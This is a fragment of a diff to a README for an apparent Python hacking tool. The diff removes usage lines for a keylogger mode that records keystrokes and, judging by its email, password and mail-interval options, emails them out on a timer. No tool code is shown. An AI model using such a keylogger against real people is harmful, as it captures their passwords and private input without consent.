@@ -11,8 +11,5 @@ Required packages for using this tool
 7) os&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  --> Used to manipulate opertaing systems
 8) sys&nbsp; &nbsp; &nbsp; &nbsp; --> Used to manipulate System commands
  
- ## How to use
- ### 1) KeyLogger:
-  - python main.py --keylisten --email xxxxx@gmail.com --password xxxxxx --mailduration xxxx(in secs) --stop xxxx(in secs)<br/>
-  - python main.py -K -e xxxxx@gmail.com -p xxxxx -D xxxx -S xxxx<br/><br/>
-**--keylisten** or **-K**&nbsp; &nbsp; &nbsp; -->&nbsp; &nbsp; &nbsp; Keyboard Listener (Store Key Strokes)<br/>
+### List of Commands
+
